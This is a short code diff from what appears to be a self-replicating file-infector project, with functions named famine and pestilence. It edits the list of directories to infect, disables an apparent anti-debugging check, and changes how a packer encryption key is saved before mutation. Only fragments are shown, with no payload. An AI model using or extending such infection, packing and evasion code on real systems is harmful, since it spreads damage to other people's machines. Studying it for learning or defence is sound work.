@@ -278,7 +278,6 @@ void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 	char *paths[] = {
 		STR(PATH1),
 		STR(PATH2),
-		STR("./tmp"),
 		NULL
 	}; JUNK;
 
@@ -298,18 +297,16 @@ void	entrypoint(int argc, char **argv, char **envp)
 	file_t file;
 	ft_memset(&file, 0, sizeof(file_t));
 
-	if (pestilence() != 0) return ;
+	//if (pestilence() != 0) return ;
 
 	/* saving these values (they will be overwritten by the packer) */
-	uint8_t key[KEY_SIZE];
-	ft_memcpy(key, g_key, KEY_SIZE);
 
 	saved_vars_t saved = {
 		.start_offset = g_start_offset,
 		.is_encrypted = g_is_encrypted,
 		.key = {0}
 	};
-	ft_memcpy(saved.key, key, KEY_SIZE);
+	ft_memcpy(saved.key, g_key, KEY_SIZE);
 
 	prepare_mutate();
 
